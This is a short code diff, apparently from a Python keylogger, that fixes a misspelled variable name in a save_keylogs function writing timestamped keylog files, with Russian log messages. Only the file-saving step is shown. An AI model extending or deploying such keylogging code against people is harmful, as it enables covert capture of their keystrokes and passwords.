@@ -86,8 +86,8 @@ def save_keylogs(logs):
         timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
         file_name = f"keylog_{timestamp}.txt"
         try:
-            with open(file_name, "w") as lof_file:
-                lof_file.write(logs + "\n")
+            with open(file_name, "w") as log_file:
+                log_file.write(logs + "\n")
             logging.info(f"[+] Кейлог сохранен в файл: {file_name}")
         except Exception as e:
             logging.error(f"[!!] Ошибка при сохранении кейлогов: {e}")
